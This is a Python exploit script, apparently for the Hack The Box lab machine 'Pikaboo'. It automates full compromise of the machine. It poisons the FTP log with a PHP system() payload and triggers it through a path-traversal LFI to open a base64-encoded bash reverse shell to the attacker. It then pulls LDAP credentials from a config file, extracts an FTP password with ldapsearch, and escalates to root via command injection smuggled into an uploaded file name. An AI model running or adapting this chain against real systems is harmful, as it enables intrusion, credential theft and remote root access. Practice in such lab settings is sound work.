import requests

from ftplib import error_perm, FTP
from pwn import b64d, b64e, listen, log, os, re, signal, sleep, sys, Thread
from typing import Tuple

signal.signal(signal.SIGINT, lambda *_: log.error('Quiting...'))

if len(sys.argv) == 1:
    log.error(f'Usage: python3 {sys.argv[0]} <htb-local-ip>')

lport = 4444
lhost = sys.argv[1]
rhost = '10.10.10.249'


def listen_for_shell(timeout: int = 20):
    shell = listen(lport, timeout=timeout).wait_for_connection()

    if shell.sock is None:
        log.error(f'Could not connect to {rhost}')

    return shell


def log_poisoning(ftp, command: str):
    log_file = '/var/log/vsftpd.log'
    lfi_website = f'http://{rhost}/admin../admin_staging/index.php'
    log_poisoning_url = f'{lfi_website}?page={log_file}'

    try:
        ftp.login(f'<?php system("{command}"); ?>', 'asdf')
    except error_perm:
        log.info(f'FTP log ({log_file}) has been poisoned')
        sleep(5)

    Thread(target=requests.get, args=(log_poisoning_url, )).start()

    return listen_for_shell()


def user_enum(shell) -> str:
    shell.sendlineafter(b'$', b'ls /home')
    shell.recvline()
    user = shell.recvline().decode().strip()

    log.info(f'Found user: {user}')
    sleep(1)

    shell.sendline(f'cat /home/{user}/user.txt'.encode())
    shell.recvline()
    user_txt = shell.recvline().decode().strip()

    log.warning(f'Found user.txt: {user_txt}')
    sleep(1)

    return user


def ldap_enum(shell) -> Tuple[str]:
    shell.sendline(b'cat /opt/pokeapi/config/settings.py')
    shell.recvuntil(b'DATABASE')
    settings = shell.recv(2048, timeout=2).decode()

    ldap_settings = re.findall(r'''
\s+"ldap": {
    \s+"ENGINE": ".*?",
    \s+"NAME": ".*?",
    \s+"USER": "(.*?)",
    \s+"PASSWORD": "(.*?)",
\s+}''', settings)

    ldap_user, ldap_password = ldap_settings[0]
    return ldap_user, ldap_password


def ldap_search(shell, user: str, ldap_user: str, ldap_password: str) -> str:
    base = 'dc=ftp,dc=pikaboo,dc=htb'
    ldapsearch = f"ldapsearch -xD {ldap_user} -w '{ldap_password}' -b {base}"

    shell.sendline(ldapsearch.encode())
    shell.recvuntil(user.encode())
    res = shell.recv(2048, timeout=2).decode()

    ftp_password_enc = re.findall(r'userPassword:: (.*?)$', res, re.MULTILINE)
    return b64d(ftp_password_enc[0]).decode()


def command_injection(ftp, ftp_user: str, ftp_password: str, command: str):
    filename = f'|{command}|.csv'
    os.system(f"touch '{filename}'")

    ftp.login(ftp_user, ftp_password)

    dirs = []
    ftp.dir(dirs.append)
    directory = dirs[0].split()[-1]

    ftp.cwd(directory)

    ftp.storlines(f'STOR {filename}', open(filename))
    log.info('Stored malicious file with injected command in filename')

    os.system(f"rm '{filename}'")
    ftp.close()

    return listen_for_shell(timeout=120)


def root_flag(shell):
    shell.sendlineafter(b'#', b'cat /root/root.txt')
    shell.recvline()
    root_txt = shell.recvline().decode().strip()

    log.warning(f'Found root.txt: {root_txt}')


def main():
    ftp = FTP(rhost)

    rev_shell = f'bash -i  >& /dev/tcp/{lhost}/{lport} 0>&1'.encode()
    command = f'echo {b64e(rev_shell)} | base64 -d | bash'

    shell = log_poisoning(ftp, command)
    user = user_enum(shell)
    ldap_user, ldap_password = ldap_enum(shell)

    log.info(f'Found LDAP user: {ldap_user}')
    log.info(f'Found LDAP password: {ldap_password}')

    ftp_password = ldap_search(shell, user, ldap_user, ldap_password)

    log.info(f'Found FTP password: {ftp_password}')

    shell = command_injection(ftp, user, ftp_password, command)
    root_flag(shell)

    log.success('Got shell as root')
    shell.interactive(prompt='')


if __name__ == '__main__':
    main()
